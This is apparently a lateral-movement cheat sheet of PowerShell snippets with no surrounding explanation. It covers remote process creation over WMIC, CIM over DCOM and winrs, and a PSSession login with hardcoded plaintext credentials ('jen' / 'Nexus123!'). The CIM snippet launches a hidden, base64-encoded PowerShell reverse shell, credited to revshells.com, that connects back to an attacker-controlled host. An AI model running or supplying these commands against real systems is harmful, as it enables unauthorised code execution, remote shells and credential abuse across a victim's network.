```powershell
wmic /node:$TARGET /user:$USERNAME /password:$PASSWORD process call create $COMMAND
```

```powershell
$ip = '10.10.10.10';
$username = 'username';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $ip -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHM dABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'; # https://www.revshells.com/
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

```powershell
winrs -r:$TARGET -u:$USERNAME -p:$PASSWORD $COMMAND # https://www.revshells.com/
```

```powershell
$ip = '10.10.10.10';
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $ip -Credential $credential
Enter-PSSession $ID
```

